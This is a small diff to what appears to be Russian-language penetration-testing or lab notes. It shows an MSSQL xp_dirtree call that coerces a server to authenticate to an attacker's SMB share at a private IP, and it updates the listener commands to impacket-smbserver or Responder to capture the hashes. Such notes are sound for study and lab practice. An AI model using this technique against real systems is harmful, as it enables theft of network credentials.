@@ -92,5 +92,7 @@ exec xp_dirtree '\\172.16.117.30\Support'
 
 Включаем сервер для приема аутентификации
 ```bash
-sudo smbserver.py share Support -smb2support
+sudo impacket-smbserver share Support -smb2support
+# or
+sudo responder -I tun0
 ```
